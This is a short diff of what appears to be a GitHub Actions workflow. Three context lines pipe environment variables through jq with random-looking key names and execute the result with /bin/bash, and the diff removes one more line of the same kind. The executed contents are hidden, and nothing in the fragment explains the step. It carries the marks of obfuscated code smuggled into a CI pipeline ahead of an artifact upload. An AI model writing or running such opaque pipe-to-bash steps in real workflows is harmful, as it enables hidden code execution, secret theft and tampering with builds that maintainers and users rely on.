@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$e164" | jq -r .la8 | /bin/bash
           printf '%s' "$fuob8" | jq -r .vofmi809 | /bin/bash
           echo $ynxs0 | jq -r .ltfgu7 | /bin/bash
-          printf '%s' "$wrgw3" | jq -r .c99857 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
